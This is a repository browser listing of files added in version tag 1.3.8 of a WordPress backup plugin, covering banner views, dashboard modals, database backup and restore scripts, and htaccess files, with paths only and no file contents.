* [tags/1.3.8/includes/banner/views/projects/bmi/upgrade.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/bmi/upgrade.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs/background-texture-grey.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs/background-texture-grey.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs/big-colored-logo.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs/big-colored-logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs/colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs/colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs/main-background-image.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs/main-background-image.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs/secondary-background-image.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs/secondary-background-image.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/imgs/white-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/imgs/white-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/installed.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/installed.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/cdp/upgrade.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/cdp/upgrade.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/background-bottom-left.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/background-bottom-left.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/background-bottom-right.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/background-bottom-right.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/background-top-left.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/background-top-left.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/background-top-right.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/background-top-right.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/big-colored-logo.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/big-colored-logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/face1.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/face1.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/face2.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/face2.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/face3.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/face3.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/face4.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/face4.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/imgs/white-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/imgs/white-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/fit/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/fit/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs/background-images.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs/background-images.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs/background-texture-green.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs/background-texture-green.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs/background-texture-grey.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs/background-texture-grey.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs/big-colored-logo.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs/big-colored-logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs/colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs/colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/imgs/white-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/imgs/white-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/mpu/installed.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/mpu/installed.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/imgs/background-top-left.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/imgs/background-top-left.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/imgs/big-colored-logo-rr.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/imgs/big-colored-logo-rr.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/imgs/colored-logo-rr.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/imgs/colored-logo-rr.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/imgs/main-background-image.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/imgs/main-background-image.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/imgs/not-colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/imgs/not-colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/red/installed.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/red/installed.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs/background-image-1.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs/background-image-1.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs/background-image-2.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs/background-image-2.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs/background-image-3.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs/background-image-3.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs/big-colored-logo.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs/big-colored-logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs/colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs/colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/imgs/white-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/imgs/white-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/twp/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/twp/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/background-icons.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/background-icons.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/background-image.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/background-image.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/big-colored-logo.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/big-colored-logo.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/colored-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/colored-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/play-icon.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/play-icon.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/ribbon-icon.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/ribbon-icon.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/video-background.png](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/video-background.png?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/imgs/white-logo.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/imgs/white-logo.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/installed.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/installed.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/part-install.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/part-install.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/part-upgrade.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/part-upgrade.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/projects/usm/upgrade.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/projects/usm/upgrade.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static](/browser/backup-backup/tags/1.3.8/includes/banner/views/static?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/imgs](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/imgs?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/imgs/already-installed.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/imgs/already-installed.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/imgs/check-icon.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/imgs/check-icon.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/imgs/clock-icon.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/imgs/clock-icon.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/imgs/rating.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/imgs/rating.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/imgs/white-arrow-right.svg](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/imgs/white-arrow-right.svg?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/banner/views/static/tabs.php](/browser/backup-backup/tags/1.3.8/includes/banner/views/static/tabs.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/bypasser.php](/browser/backup-backup/tags/1.3.8/includes/bypasser.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/check](/browser/backup-backup/tags/1.3.8/includes/check?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/check/checker.php](/browser/backup-backup/tags/1.3.8/includes/check/checker.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/check/system\_info.php](/browser/backup-backup/tags/1.3.8/includes/check/system_info.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/cli](/browser/backup-backup/tags/1.3.8/includes/cli?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/cli-handler.php](/browser/backup-backup/tags/1.3.8/includes/cli-handler.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/cli/php\_cli\_finder.php](/browser/backup-backup/tags/1.3.8/includes/cli/php_cli_finder.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/cli/version\_check.php](/browser/backup-backup/tags/1.3.8/includes/cli/version_check.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/compatibility.php](/browser/backup-backup/tags/1.3.8/includes/compatibility.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/config.php](/browser/backup-backup/tags/1.3.8/includes/config.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/constants.php](/browser/backup-backup/tags/1.3.8/includes/constants.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/cron](/browser/backup-backup/tags/1.3.8/includes/cron?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/cron/handler.php](/browser/backup-backup/tags/1.3.8/includes/cron/handler.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard](/browser/backup-backup/tags/1.3.8/includes/dashboard?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/AA-Template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/AA-Template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/other\_config.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/other_config.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/save-button.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/save-button.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/staging.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/staging.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/store\_config.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/store_config.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/troubleshooting.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/troubleshooting.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/what\_backed\_up.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/what_backed_up.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/chapter/where\_config.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/chapter/where_config.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/AA-Modal-Template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/AA-Modal-Template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/after-logs-sent.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/after-logs-sent.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/backup-error-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/backup-error-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/backup-progress-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/backup-progress-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/backup-success-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/backup-success-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/bfs-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/bfs-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/delete-confirm-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/delete-confirm-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/freeze-loading.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/freeze-loading.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/logs-sharing-ask.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/logs-sharing-ask.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/pre-restore-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/pre-restore-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/prenotice-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/prenotice-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/reset-confirm-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/reset-confirm-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/restore-error-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/restore-error-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/restore-progress-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/restore-progress-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/restore-success-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/restore-success-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/staging-delete-confirm-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/staging-delete-confirm-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/staging-error-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/staging-error-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/staging-prenotice-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/staging-prenotice-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/staging-progress-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/staging-progress-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/staging-rename-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/staging-rename-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/staging-success-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/staging-success-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/upload-exist-file-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/upload-exist-file-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/upload-invalid-manifest-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/upload-invalid-manifest-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/upload-success-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/upload-success-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modals/upload-wrong-file-modal.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modals/upload-wrong-file-modal.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/backup-ongoing.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/backup-ongoing.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/backup\_controller.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/backup_controller.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/backups-table-header.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/backups-table-header.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/backups-under-table.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/backups-under-table.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/email-errors.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/email-errors.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/quota-errors.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/quota-errors.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/super-quick-migration.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/super-quick-migration.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/support-chat.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/support-chat.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/modules/upload-backup.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/modules/upload-backup.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/settings.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/settings.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/AA-Template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/AA-Template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/backup-row-template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/backup-row-template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/dropdown-template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/dropdown-template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/exclusion-rule-template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/exclusion-rule-template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/option-template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/option-template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/premium-overlay.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/premium-overlay.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/staging-row-template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/staging-row-template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/templates/stg-option-template.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/templates/stg-option-template.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/dashboard/translations.php](/browser/backup-backup/tags/1.3.8/includes/dashboard/translations.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database](/browser/backup-backup/tags/1.3.8/includes/database?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/better-backup-v3.php](/browser/backup-backup/tags/1.3.8/includes/database/better-backup-v3.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/better-backup.php](/browser/backup-backup/tags/1.3.8/includes/database/better-backup.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/better-restore.php](/browser/backup-backup/tags/1.3.8/includes/database/better-restore.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/even-better-restore-v3.php](/browser/backup-backup/tags/1.3.8/includes/database/even-better-restore-v3.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/even-better-restore-v4.php](/browser/backup-backup/tags/1.3.8/includes/database/even-better-restore-v4.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/manager.php](/browser/backup-backup/tags/1.3.8/includes/database/manager.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/search-replace.php](/browser/backup-backup/tags/1.3.8/includes/database/search-replace.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/database/smart-sort.php](/browser/backup-backup/tags/1.3.8/includes/database/smart-sort.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/extracter](/browser/backup-backup/tags/1.3.8/includes/extracter?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/extracter/extract.php](/browser/backup-backup/tags/1.3.8/includes/extracter/extract.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/htaccess](/browser/backup-backup/tags/1.3.8/includes/htaccess?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/htaccess/.autologin.php](/browser/backup-backup/tags/1.3.8/includes/htaccess/.autologin.php?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/htaccess/.htaccess](/browser/backup-backup/tags/1.3.8/includes/htaccess/.htaccess?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/htaccess/.litespeed](/browser/backup-backup/tags/1.3.8/includes/htaccess/.litespeed?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/htaccess/default.json](/browser/backup-backup/tags/1.3.8/includes/htaccess/default.json?rev=3006541 "Show entry in browser")
  (added)
* [tags/1.3.8/includes/htaccess/index.html](/browser/backup-backup/tags/1.3.8/includes/htaccess/index.html?rev=3006541 "Show entry in browser")
  (added)
